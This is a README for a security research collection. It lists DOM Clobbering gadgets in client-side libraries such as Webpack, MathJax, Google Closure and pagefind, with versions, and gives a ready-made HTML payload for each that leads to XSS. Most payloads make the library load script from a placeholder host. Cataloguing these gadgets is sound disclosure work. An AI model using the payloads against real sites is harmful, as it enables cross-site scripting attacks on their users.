# DOM Clobbering Collection

In this repo, we collect a list of client-side libraries that are either vulnerable to HTML injection or contain DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.

## HTML Injection

## DOM Clobbering Gadgets

| Library | Version | Payloads | Impact | Found By |
|:-------:|:-------:|----------|:------:|:--------:|
| [AddToAny](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/addtoany.md) |  | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk |
| [doomcaptcha](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/doomcaptcha.md) |  | ```<img name=currentScript label="<script>alert(1)</script>"></img>``` | XSS | TheHulk |
| [Google Client API](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-client-api.md) | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe>``` | XSS | TheHulk |
| [Google Closure Library](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-closure-library.md) | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax.md) | 2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md) | 3.2.2 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk |
| [pagefind](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md) | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk |
| [steal](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md) | 2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk |
| [Webpack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md) | 5.x.x | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk |
